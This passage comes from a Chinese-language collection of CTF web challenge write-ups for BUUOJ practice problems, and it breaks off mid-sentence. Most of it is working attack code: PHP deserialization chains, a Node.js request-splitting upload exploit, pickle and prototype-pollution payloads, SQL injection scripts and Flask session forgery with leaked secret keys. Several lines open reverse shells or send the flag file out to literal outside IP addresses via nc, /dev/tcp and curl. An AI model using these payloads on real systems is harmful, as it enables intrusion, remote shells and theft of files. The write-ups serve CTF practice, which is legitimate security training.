22%3BN%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000001dae5f69000000005d7b61f7%22%3B%7D%7D%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3BN%3B%7Ds%3A21%3A%22%00think%5CModel%00relation%22%3BN%3Bs%3A10%3A%22%00%2A%00visible%22%3BN%3Bs%3A21%3A%22%00think%5CModel%00withAttr%22%3BN%3Bs%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A8%3A%22wh1t3p1g%22%3Ba%3A0%3A%7B%7D%7Ds%3A7%3A%22%00%2A%00type%22%3BN%3Bs%3A12%3A%22%00%2A%00withEvent%22%3Bb%3A0%3B%7D\n```\n\n## [CISCN2019 总决赛 Day1 Web4]Laravel1\n\n从头开始找反序列化链子呗\n\n/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php中的`__destruct`方法为起始点，跟进`commit`方法，跟进`invalidateTags`方法\n\n```php\nif ($this->deferred) {\n    $items = $this->deferred;\n    foreach ($items as $key => $item) {\n        if (!$this->pool->saveDeferred($item)) {\n            unset($this->deferred[$key]);\n            $ok = false;\n        }\n    }\n\n    $f = $this->getTagsByKey;\n    $tagsByKey = $f($items);\n    $this->deferred = [];\n}\n```\n\n此处调用了pool的saveDeferred方法，pool可控，但是在`__construct`中限定了pool的类型需要是`AdapterInterface`，下一步就是找一个是`AdapterInterface`并且带有`saveDeferred`方法的类，看到这里/source/vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php的`saveDeferred`，传入变量要求为`CacheItemInterface`类，全局搜索该类\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141634553.png)\n\n条件满足继续走方法\n\n```php\nprivate function initialize()\n{\n    if (!file_exists($this->file)) {\n        $this->keys = $this->values = [];\n\n        return;\n    }\n    $values = (include $this->file) ?: [[], []];\n\n    if (2 !== \\count($values) || !isset($values[0], $values[1])) {\n        $this->keys = $this->values = [];\n    } else {\n        list($this->keys, $this->values) = $values;\n    }\n}\n```\n\n此处include了文件，最终的文件读取，按照上述内容构造exp，注意命名空间\n\n```php\n<?php\nnamespace Symfony\\Component\\Cache{\n    final class CacheItem{\n    }\n}\n\nnamespace Symfony\\Component\\Cache\\Adapter{\n    use Symfony\\Component\\Cache\\CacheItem;\n    class PhpArrayAdapter{\n        private $file='/flag';\n    }\n    class TagAwareAdapter{\n        private $deferred;\n        private $pool;\n        public function __construct(){\n            $this->deferred = array('xxx' => new CacheItem());\n            $this->pool = new PhpArrayAdapter();\n        }\n    }\n$a=new TagAwareAdapter();\necho urlencode(serialize($a));\n}\n?>\n```\n\n## virink_2019_files_share\n\n看源码，uploads文件夹，随便点一个文件看参数，任意文件读取，此处要绕一下../，变成...//\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141718491.png)\n\n## [NESTCTF 2019]Love Math 2\n\n和Love Math一样，构造_GET来自己塞东西进去\n\n```php\n<?php\n$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\nfor($k=1;$k<=sizeof($payload);$k++){\n    for($i = 0;$i < 9; $i++){\n        for($j = 0;$j <=9;$j++){\n            $exp = $payload[$k] ^ $i.$j;\n            echo($payload[$k].\"^$i$j\".\"==>$exp\");\n            echo \"<br />\";\n        }\n    }\n}\n```\n\n最终payload\n\n```\n?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag\n```\n\n## [PASECA2019]honey_shop\n\n提示图片点击可以下载，任意文件读取\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151413306.png)\n\n读取到环境变量中的`SECRET_KEY=Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR`，源码读不到但是知道是python环境，flask-session伪造\n\n```\npython3 flask_session_cookie_manager3.py encode -s \"私钥\"  -t \"内容\" \npython3 flask_session_cookie_manager3.py encode -s \"Ya300IkfSE7qZtNFuMzRj1bJXD8nob8ArGUejqgR\"  -t \"{'balance':114514}\" \n```\n\n## [GYCTF2020]Node Game\n\n源码喵喵\n\n```javascript\nvar express = require('express');\nvar app = express();\nvar fs = require('fs');\nvar path = require('path');\nvar http = require('http');\nvar pug = require('pug');\nvar morgan = require('morgan');\nconst multer = require('multer');\napp.use(multer({dest: './dist'}).array('file'));\napp.use(morgan('short'));\napp.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))\napp.use(\"/template\",express.static(path.join(__dirname, '/template')))\napp.get('/', function(req, res) {\n    var action = req.query.action?req.query.action:\"index\";\n    if( action.includes(\"/\") || action.includes(\"\\\\\") ){//action参数过滤斜杠杠\n        res.send(\"Errrrr, You have been Blocked\");\n    }\n    file = path.join(__dirname + '/template/'+ action +'.pug');\n    var html = pug.renderFile(file);//用pug引擎渲染\n    res.send(html);\n});\napp.post('/file_upload', function(req, res){\n    var ip = req.connection.remoteAddress;//不能用X-Forwarded-For伪造\n    var obj = {\n        msg: '',\n    }\n    if (!ip.includes('127.0.0.1')) {\n        obj.msg=\"only admin's ip can use it\"\n        res.send(JSON.stringify(obj));\n        return \n    }\n    fs.readFile(req.files[0].path, function(err, data){\n        if(err){\n            obj.msg = 'upload failed';\n            res.send(JSON.stringify(obj));\n        }else{\n            var file_path = '/uploads/' + req.files[0].mimetype +\"/\";\n          \t//任意文件上传并且通过MIME类型来保存文件位置，MIME可控所以可以进行目录穿越\n            var file_name = req.files[0].originalname\n            var dir_file = __dirname + file_path + file_name\n            if(!fs.existsSync(__dirname + file_path)){\n                try {\n                    fs.mkdirSync(__dirname + file_path)\n                } catch (error) {\n                    obj.msg = \"file type error\";\n                    res.send(JSON.stringify(obj));\n                    return\n                }\n            }\n            try {\n                fs.writeFileSync(dir_file,data)\n                obj = {\n                    msg: 'upload success',\n                    filename: file_path + file_name\n                } \n            } catch (error) {\n                obj.msg = 'upload failed';\n            }\n            res.send(JSON.stringify(obj));    \n        }\n    })\n})\napp.get('/source', function(req, res) {\n    res.sendFile(path.join(__dirname + '/template/source.txt'));\n});\napp.get('/core', function(req, res) {\n    var q = req.query.q;\n    var resp = \"\";\n    if (q) {\n        var url = 'http://localhost:8081/source?' + q//对参数q进行处理并进行本地访问，纯纯SSRF\n        console.log(url)\n        var trigger = blacklist(url);\n        if (trigger === true) {\n            res.send(\"<p>error occurs!</p>\");\n        } else {\n            try {\n                http.get(url, function(resp) {\n                    resp.setEncoding('utf8');\n                    resp.on('error', function(err) {\n                    if (err.code === \"ECONNRESET\") {\n                     console.log(\"Timeout occurs\");\n                     return;\n                    }\n                   });\n\n                    resp.on('data', function(chunk) {\n                        try {\n                         resps = chunk.toString();\n                         res.send(resps);\n                        }catch (e) {\n                           res.send(e.message);\n                        }\n \n                    }).on('error', (e) => {\n                         res.send(e.message);});\n                });\n            } catch (error) {\n                console.log(error);\n            }\n        }\n    } else {\n        res.send(\"search param 'q' missing!\");\n    }\n})\nfunction blacklist(url) {\n    var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"];\n    var arrayLen = evilwords.length;\n    for (var i = 0; i < arrayLen; i++) {\n        const trigger = url.includes(evilwords[i]);\n        if (trigger === true) {\n            return true\n        }\n    }\n}\nvar server = app.listen(8081, function() {\n    var host = server.address().address\n    var port = server.address().port\n    console.log(\"Example app listening at http://%s:%s\", host, port)\n})\n\n```\n\n能分析的都写到代码注释里面了，下面要利用的一个node.js早期的拆分攻击漏洞，先贴一个大佬[wp](https://blog.csdn.net/cjdgg/article/details/119068329)\n\n拆分攻击，是指在HTTP请求头中伪造出\\r\\n转义字符，来使得HTTP服务器将一个请求当作两个或多个请求执行，当然，大部分服务器都考虑到了这种情况，会将传来的内容进行转译，node.js也不例外，但是在node.js 8版本及以前，node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，导致字符会被截断，使得我们需要的\\r\\n出现，具体可见下面的内容\n\n> # HTTP请求路径中的unicode字符损坏\n>\n> 一切都开始于我调试的一个非关联的unicode处理issue，并最终将我引向一个错误报告：[bug report against the Node.js `http` module](https://github.com/nodejs/node/issues/13296),报告中提到：\n>\n> [![img](https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png)\n>\n> 换句话说，报告者使用Node.js向特定路径发出HTTP请求，但是发出的请求实际上被定向到了不一样的路径！深入研究一下，发现这个问题是由Node.js将HTTP请求写入路径时对unicode字符的有损编码引起的。\n>\n> 虽然用户发出的`http`请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符，例如🐶\n>\n> 相反，这些字符被截断为其JavaScript表示的最低字节：\n> [![img](https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png)\n>\n> 处理用户输入时的坏数据通常是底层安全问题的危险信号，我知道我们的代码库发出了可能包含用户输入的路径的HTTP请求。所以我立即在Bugzilla中提交了一个保密的安全漏洞，向node安全团队寻求更多信息，然后根据用户提供的unicode字符串寻找我们可能构建URL的地方。\n>\n> 内容源自：https://xz.aliyun.com/t/2894\n\n偷一个大佬的脚本\n\n```python\nimport requests\n\npayload = \"\"\" HTTP/1.1\nHost: 127.0.0.1\nConnection: keep-alive\n\nPOST /file_upload HTTP/1.1\nHost: 127.0.0.1\nContent-Length: {}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt\n\n{}\"\"\".replace('\\n', '\\r\\n')\n\nbody = \"\"\"------WebKitFormBoundarysAs7bV3fMHq0JXUt\nContent-Disposition: form-data; name=\"file\"; filename=\"lmonstergg.pug\"\nContent-Type: ../template\n\n-var x = eval(\"glob\"+\"al.proce\"+\"ss.mainMo\"+\"dule.re\"+\"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()\")\n-return x\n------WebKitFormBoundarysAs7bV3fMHq0JXUt--\n\n\"\"\".replace('\\n', '\\r\\n')\n\npayload = payload.format(len(body), body) \\\n    .replace('+', '\\u012b')             \\\n    .replace(' ', '\\u0120')             \\\n    .replace('\\r\\n', '\\u010d\\u010a')    \\\n    .replace('\"', '\\u0122')             \\\n    .replace(\"'\", '\\u0a27')             \\\n    .replace('[', '\\u015b')             \\\n    .replace(']', '\\u015d') \\\n    + 'GET' + '\\u0120' + '/'\n\nsession = requests.Session()\nsession.trust_env = False\nresponse1 = session.get('http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/core?q=' + payload)\nresponse = session.get('http://8467d768-1851-4764-bf73-e93bedea88bc.node4.buuoj.cn:81/?action=lmonstergg')\nprint(response.text)\n```\n\n## [watevrCTF-2019]Pickle Store\n\n明示pickle，先解码看看\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151820591.png)\n\n很明显有加密验证啊，那就不能伪造内容了，只能自己搞个类反弹shell了\n\n```python\nimport base64\nimport pickle\n\nclass A(object):\n    def __reduce__(self):\n        return (eval, (\"__import__('os').system('nc 43.249.193.167 38901 -e/bin/sh')\",))\na = A()\nprint(base64.b64encode(pickle.dumps(a)))\n```\n\n## [CISCN2019 华东北赛区]Web2\n\nXSSSSSSSSSSSSSS，不出网，还是之后XSS平台能用了再说吧\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## [RootersCTF2019]ImgXweb\n\n注册登录看到jwt，扫目录扫出来密钥，直接伪造admin就行\n\n## [GWCTF 2019]你的名字\n\n除了SSTI还能是啥\n\n测试呗，输入个两对花括号发现被滤了，~~还爆出了是php环境，其实并不是，估计是BUU复现环境的问题~~\n\n没关系还有命令执行可用，啥符号都没过滤直接拼接就行\n\n## [BSidesCF 2020]Hurdles\n\n谢谢这道题，让我狠狠了解了一把curl怎么用\n\n```bash\ncurl -i -X PUT 'http://node4.buuoj.cn:26923/hurdles/!?get=flag&%26%3D%26%3D%26=%2500%0a' -u 'player:54ef36ec71201fdf9d1423fd26f97f6b' -A '1337 Browser v.9001' -H \"X-Forwarded-For:13.37.13.37,127.0.0.1\" -b \"Fortune=6265\" -H \"Accept:text/plain\" -H \"Accept-Language:ru\" -H \"origin:https://ctf.bsidessf.net\" -H \"referer:https://ctf.bsidessf.net/challenges\"\n```\n\ncurl使用方法\n\n```bash\ncurl -o 文件名 链接 #下载URL内容并重命名为文件名\n-O 链接 #以URL结尾做文件名\n-L #跟随重定向跳转\n-C - -O 链接 #继续被中断的下载\n--trace-ascii 文件 链接 #将整个curl命令执行过程写入文件\n-X 请求方式 #使用指定的请求方式来发起请求\n-F \"name=@文件本地路径\" #上传文件\n--data #带POST参数，可带json\n--cookie #携带cookie\n--cookie stored_cookies_file_path #读取cookie\n--user-agent 或者 -A #带UA头\n-H #带请求头\n--user username:password #通过Basic Authentication验证\n-i #显示完整响应\n```\n\n## [HarekazeCTF2019]Easy Notes\n\n代码审计和SESSION文件伪造\n\n看拿flag的要求是`$SESSION['admin']==true`，在文件下载代码处可看到，生成文章打包后文件和SESSION文件存储在同一文件夹下，可以进行伪造，看文件名处理的代码\n\n```php\n$filename = get_user() . '-' . bin2hex(random_bytes(8)) . '.' . $type;\n$filename = str_replace('..', '', $filename); // avoid path traversal\n$path = TEMP_DIR . '/' . $filename;\n```\n\n此处将文件名命名为`用户名-随机8位16进制数.type参数`，并且如果有两个.还会将其替换为空，那么我们构造用户名为`sess_`，type为`.`最终生成的文件就是`sess_-随机8位16进制数`，刚好符合SESSION文件存储命名，而又因为下面生成文件使用的是zip方式打包，文本原样写入，我们只需要在文章标题处构造`admin|b:1;`就能被默认反序列化方式获取，而为了防止前后字符影响，构造标题为`xxxx|N;admin|b:1;xxxxxx`，通过下载获取SESSID，修改cookie即可\n\n## [BSidesCF 2019]Pick Tac Toe\n\n看页面代码，按照对应字符传参可覆盖电脑步数\n\n## [RCTF 2019]Nextphp\n\n禁用了一堆函数，并且带有openbase_dir，通过glob协议扫出flag在根目录，然后当前目录还有一个php文件，代码如下\n\n```php\n<?php\nfinal class A implements Serializable {\n    protected $data = [\n        'ret' => null,\n        'func' => 'print_r',\n        'arg' => '1'\n    ];\n\n    private function run () {\n        $this->data['ret'] = $this->data['func']($this->data['arg']);\n    }\n\n    public function __serialize(): array {\n        return $this->data;\n    }\n\n    public function __unserialize(array $data) {\n        array_merge($this->data, $data);\n        $this->run();\n    }\n\n    public function serialize (): string {\n        return serialize($this->data);\n    }\n\n    public function unserialize($payload) {\n        $this->data = unserialize($payload);\n        $this->run();\n    }\n\n    public function __get ($key) {\n        return $this->data[$key];\n    }\n\n    public function __set ($key, $value) {\n        throw new \\Exception('No implemented');\n    }\n\n    public function __construct () {\n        throw new \\Exception('No implemented');\n    }\n}\n```\n\n此处利用的是php7.4新引进的一项特性：[FFI扩展详解](https://www.laruence.com/2020/03/11/5475.html)\n\n总体的FFI调用逻辑就是\n\n```php\n<?php\n\t\t$a=FFI::cdef(C中的函数A(C中定义函数A的参数);C中的函数B(C中定义函数B的参数);,\"需要加在的动态库\");\n\t\t$a->A(A参数);\n?>\n```\n\n那么在上面的这个序列化内容中我们就可以做如下构造\n\n```php\n<?php\nfinal class A implements Serializable {\n    protected $data = [\n        'ret' => null,\n        'func' => 'FFI::cdef',\n        'arg' => 'int system(char *command);'\n    ];\n    public function serialize (): string {\n        //此处两个函数需要保留是因为Serializable是一个接口，其中的属性不再次经过声明是不能进行序列化和反序列化的\n        return serialize($this->data);\n    }\n    public function unserialize($payload) {\n    }\n}\n$a = new A();\necho serialize($a);\n?>\n```\n\n由于在反序列化时会执行run函数，将FFI调用后的结果传给$data->ret变量，进而对ret调用即可调用C中的system函数，绕过php的限制，不能直接访问data因为其为保护属性\n\n```\npayload:?a=$a=unserialize('C:1:\"A\":89:{a:3:{s:3:\"ret\";N;s:4:\"func\";s:9:\"FFI::cdef\";s:3:\"arg\";s:26:\"int system(char *command);\";}}');\n$a-> __serialize()['ret']->system('curl -d @/flag 182.61.46.138:12345');\n```\n\n## [watevrCTF-2019]Supercalc\n\n合理怀疑SSTI，但是双花括号被过滤了，试试让程序报错，使用1/0，得到报错\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162052551.png)\n\n那在后面贴上注释，看看里面会不会被执行，传入了没执行\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162053572.png)\n\n那再传入模版语法试试，成功爆出`SECRET_KEY`\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162055573.png)\n\n尝试直接传入提示长度过长，那就伪造session吧\n\n```bash\npython3 *3.py encode -s \"cded826a1e89925035cc05f0907855f7\" -t '{\"history\":[{\"code\":\"__import__(\\\"os\\\").popen(\\\"cat flag.txt\\\").read()\"}]}'\n```\n\n## [SWPU2019]Web3\n\n伪造session，访问个404的网站，可以拿到`SECRET_KEY:keyqqqwwweee!@#$%^&*`\n\nID处base64解码发现是100，伪造成1试试\n\n```\npython3 *3.py encode -s 'keyqqqwwweee!@#$%^&*' -t '{\"id\":{\"b\":\"1\"},\"is_login\":True,\"password\":\"admin\",\"username\":\"admin\"}' \n```\n\n进去了，有源码\n\n```python\n@app.route('/upload',methods=['GET','POST'])\ndef upload():\n    if session['id'] != b'1':\n        return render_template_string(temp)\n    if request.method=='POST':\n        m = hashlib.md5()\n        name = session['password']\n        name = name+'qweqweqwe'\n        name = name.encode(encoding='utf-8')\n        m.update(name)\n        md5_one= m.hexdigest()\n        n = hashlib.md5()\n        ip = request.remote_addr\n        ip = ip.encode(encoding='utf-8')\n        n.update(ip)\n        md5_ip = n.hexdigest()\n        f=request.files['file']\n        basepath=os.path.dirname(os.path.realpath(__file__))\n        path = basepath+'/upload/'+md5_ip+'/'+md5_one+'/'+session['username']+\"/\"\n        path_base = basepath+'/upload/'+md5_ip+'/'\n        filename = f.filename\n        pathname = path+filename\n        if \"zip\" != filename.split('.')[-1]:\n            return 'zip only allowed'\n        if not os.path.exists(path_base):\n            try:\n                os.makedirs(path_base)\n            except Exception as e:\n                return 'error'\n        if not os.path.exists(path):\n            try:\n                os.makedirs(path)\n            except Exception as e:\n                return 'error'\n        if not os.path.exists(pathname):\n            try:\n                f.save(pathname)\n            except Exception as e:\n                return 'error'\n        try:\n            cmd = \"unzip -n -d \"+path+\" \"+ pathname\n            if cmd.find('|') != -1 or cmd.find(';') != -1:\n\t\t\t\twaf()\n                return 'error'\n            os.system(cmd)\n        except Exception as e:\n            return 'error'\n        unzip_file = zipfile.ZipFile(pathname,'r')\n        unzip_filename = unzip_file.namelist()[0]\n        if session['is_login'] != True:\n            return 'not login'\n        try:\n            if unzip_filename.find('/') != -1:\n                shutil.rmtree(path_base)\n                os.mkdir(path_base)\n                return 'error'\n            image = open(path+unzip_filename, \"rb\").read()\n            resp = make_response(image)\n            resp.headers['Content-Type'] = 'image/png'\n            return resp\n        except Exception as e:\n            shutil.rmtree(path_base)\n            os.mkdir(path_base)\n            return 'error'\n    return render_template('upload.html')\n@app.route('/showflag')\ndef showflag():\n    if True == False:\n        image = open(os.path.join('./flag/flag.jpg'), \"rb\").read()\n        resp = make_response(image)\n        resp.headers['Content-Type'] = 'image/png'\n        return resp\n    else:\n        return \"can't give you\"\n```\n\n大概流程就是，上传一个zip压缩的图片，然后解压并返回内容展示，看到下面flag在`./flag/flag.jpg`中，伪造软连接\n\n```\nzip命令中\n-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。\n```\n\n将其上传即可\n\n## [网鼎杯2018]Unfinish\n\n二次注入啊二次注入\n\n偷个脚本\n\n```python\nimport base64   # 用来解16进制\nimport re       # 正则匹配\nimport sys\nimport time\nimport requests\nurl=\"http://a13c51eb-d523-492b-82c0-82566d5c46a1.node4.buuoj.cn:81/\"\npayload=\"0'+(hex(hex((substr((select * from flag) from {} for 3)))))+'0\" ## 必须保证有flag表，且flag表里只有一行一列，多列需要使用group_concat来连接\n\nresult=\"\"\ndef fund(txt):\n    t = re.findall(\"<span class=\\\"user-name\\\">\\n(.*?)</span>\", txt)\n    t = t[0].strip()\n    if not int(t) > 0:\n        sys.exit(1)\n    # t=base64.b16decode(t)\n    # t = base64.b16decode(t).decode(\"ascii\")\n    t=bytes.fromhex(t).decode('utf-8')  ### 必须要求t为 str\n    t=bytes.fromhex(t).decode('utf-8')  ### bytes.fromhex 返回结果是bytes类型的\n    # print(t)\n    global result\n    result+=t\nfor  a in range(1,100):\n    register={\n        \"email\":\"1112223@1123111\"+str(a),\n        \"username\":payload.format((a-1)*3+1),\n        \"password\":\"123\"\n    }\n    login= {\n        \"email\": \"1112223@1123111\" + str(a),\n        \"password\": \"123\"\n     }\n    r=requests.session()\n    r1=r.post(url+\"register.php\",data=register)\n    if r1.status_code == 429:\n        time.sleep(3)\n    else:\n        r2=r.post(url+\"login.php\",data=login)\n        if r2.status_code==429:\n            time.sleep(3)\n        else:\n            r3=r.post(url+\"index.php\")\n            if r3.status_code ==429:\n                time.sleep(3)\n                r3 = r.post(url + \"index.php\")\n                fund(r3.text)\n            else:\n                fund(r3.text)\n\n    print(result)\n```\n\n## [CSAWQual 2016]i_got_id\n\n看代码，对上传文件的处理\n\n```\nif ($cgi->upload('file')) {\n    my $file = $cgi->param('file');\n    while (<$file>) {\n        print \"$_\";\n        print \"<br />\";\n    }\n}\n```\n\n> 其中`my $file= $cgi->param( 'file' );`中的`param()`函数返回一个列表的文件。但是只有第一个文件会被放入file变量中。\n>\n> while ( <$file> )中，<>不能处理字符串，除非是ARGV，因此循环遍历并将每个值使用open()\n> 调用。\n>\n> 对于读文件，如果传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。\n> 所以，在上传的正常文件前加上一个文件上传项ARGV，然后在URL中传入文件路径参数，就可以读取任意文件。\n\nARGV就是命令行参数\n\n## [FBCTF2019]Event\n\n看参数在event_important处有SSTI，再看cookie中有session，肯定是伪造没跑了，先捞出私钥`__class__.__init__.__globals__[app].config`，` 'SECRET_KEY': 'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'`，然后脚本伪造就行了\n\n```python\nfrom flask import Flask\nfrom flask.sessions import SecureCookieSessionInterface\napp = Flask(__name__)\napp.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'\nsession_serializer = SecureCookieSessionInterface().get_signing_serializer(app)\n@app.route('/')\ndef index():\n    print(session_serializer.dumps(\"admin\"))\nindex()\n```\n\n## [网鼎杯 2020 玄武组]SSRFMe\n\n先使用0.0.0.0拿到hint，`redispass is root`，说明目标应该是开启了redis服务并且密码是root，此处利用的是Redis主从复制来getshell\n\n> ### Redis主从复制\n>\n> Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。\n\n所以我们这题的思路是，创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 slaveof 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，并将dbfilename设置为exp.so。最后再控制Redis从机（slaver）加载模块执行系统命令即可。\n首先需要这两个项目\n\n[恶意so](https://github.com/n0b0dyCN/redis-rogue-server)\n\n[伪造主机](https://github.com/xmsec/redis-ssrf)\n\n将恶意so项目中的exp.so文件放到伪造主机项目的目录中，伪造主机项目中更改ssrf那个python文件来生成payload，然后使用server文件来开启伪装服务器，传入执行即可\n\n## [网鼎杯 2020 青龙组]notes\n\n给源码了，直接看重点\n\n```javascript\nconst undefsafe = require('undefsafe');\nedit_note(id, author, raw) {\n    undefsafe(this.note_list, id + '.author', author);\n    undefsafe(this.note_list, id + '.raw_note', raw);\n}\napp.route('/edit_note')\n    .get(function(req, res) {\n        res.render('mess', {message: \"please use POST to edit a note\"});\n    })\n    .post(function(req, res) {\n        let id = req.body.id;\n        let author = req.body.author;\n        let enote = req.body.raw;\n        if (id && author && enote) {\n            notes.edit_note(id, author, enote);\n            res.render('mess', {message: \"edit note sucess\"});\n        } else {\n            res.render('mess', {message: \"edit note failed\"});\n        }\n    })\napp.route('/status')\n    .get(function(req, res) {\n        let commands = {\n            \"script-1\": \"uptime\",\n            \"script-2\": \"free -m\"\n        };\n        for (let index in commands) {\n            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {\n                if (err) {\n                    return;\n                }\n                console.log(`stdout: ${stdout}`);\n            });\n        }\n        res.send('OK');\n        res.end();\n    })\n\n```\n\n调用了undefsafe模块，该模块在版本小于2.0.3的时候存在原型链污染漏洞\n\n![](https://img-blog.csdnimg.cn/70ea2b9eee5c499f9bc3aa29c3ac94f7.png)\n\n问题就出在对不存在的属性进行赋值的时候，传入`__proto__`就会导致原型链污染，看代码中`undefsafe(this.note_list, id + '.author', author);`其中id和auther我们都可控，在author处放入我们想要执行的命令，id处构造`__proto__`即可完成原型链污染，导致信息传入命令执行\n\n```\nid=__proto__&author=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F43.249.193.167%2F38901%200%3E%261&raw=kkk\n```\n\n## [羊城杯 2020]Easyphp2\n\n进去先用双URL编码绕过waf读源码\n\n```php\n    <?php\n    ini_set('max_execution_time', 5);\n    if ($_COOKIE['pass'] !== getenv('PASS')) {\n        setcookie('pass', 'PASS');\n        die('<h2>'.'<hacker>'.'<h2>'.'<br>'.'<h1>'.'404'.'<h1>'.'<br>'.'Sorry, only people from GWHT are allowed to access this website.'.'23333');\n    }\n    ?>\n    <?php\n    if (isset($_GET[\"count\"])) {\n        $count = $_GET[\"count\"];\n        if(preg_match('/;|base64|rot13|base32|base16|<\\?php|#/i', $count)){\n        \tdie('hacker!');\n        }\n        echo \"<h2>The Count is: \" . exec('printf \\'' . $count . '\\' | wc -c') . \"</h2>\";\n    }\n    ?>\n```\n\n读robots，发现check.php\n\n```php\n<?php\n$pass = \"GWHT\";\n// Cookie password.\necho \"Here is nothing, isn't it ?\";\nheader('Location: /');\n```\n\n更改cookie中的pass，出了个文本框，内容传入count被执行，写个shell进去，然后蚁剑连接，找到flag.txt发现没有读取权限，看README解出密码`GWHTCTF`，使用su命令切换用户，读取flag\n\n```\nshell=system(\"printf 'GWHTCTF' | su  -c 'cat /GWHT/system/of/a/down/flag.txt' GWHT\");\n```\n\n## [HFCTF 2021 Final]easyflask\n\n读文件，读源码，读下环境找到`secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh`，看session，明显一个pickle，伪造上传就行了\n\n```\n#!/usr/bin/python3.6\nimport os\nimport pickle\n\nfrom base64 import b64decode\nfrom flask import Flask, request, render_template, session\n\napp = Flask(__name__)\napp.config[\"SECRET_KEY\"] = \"*******\"\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 0,\n    '__repr__': lambda o: o.uname,\n})\n\n\n@app.route('/', methods=('GET',))\ndef index_handler():\n    if not session.get('u'):\n        u = pickle.dumps(User())\n        session['u'] = u\n    return \"/file?file=index.js\"\n\n\n@app.route('/file', methods=('GET',))\ndef file_handler():\n    path = request.args.get('file')\n    path = os.path.join('static', path)\n    if not os.path.exists(path) or os.path.isdir(path) \\\n            or '.py' in path or '.sh' in path or '..' in path or \"flag\" in path:\n        return 'disallowed'\n\n    with open(path, 'r') as fp:\n        content = fp.read()\n    return content\n\n\n@app.route('/admin', methods=('GET',))\ndef admin_handler():\n    try:\n        u = session.get('u')\n        if isinstance(u, dict):\n            u = b64decode(u.get('b'))\n        u = pickle.loads(u)\n    except Exception:\n        return 'uhh?'\n\n    if u.is_admin == 1:\n        return 'welcome, admin'\n    else:\n        return 'who are you?'\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80, debug=False)\n\n```\n\n```python\nimport pickle\nfrom base64 import b64encode\nimport os\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 1,\n    '__repr__': lambda o: o.uname,\n    '__reduce__': lambda o: (os.system, (\"bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'\",))\n\n})\nu = pickle.dumps(User())\nprint(b64encode(u).decode())\n```\n\n## [HITCON 2016]Leaking\n\n这是一道关于node.js沙箱逃逸的问题\n大致说一下 题目的描述，首先定义变量flag，然后我们可以在沙箱里面执行任意的命令，那我们如何逃逸出去呢？\n\n> 在较早一点的 node 版本中 (8.0 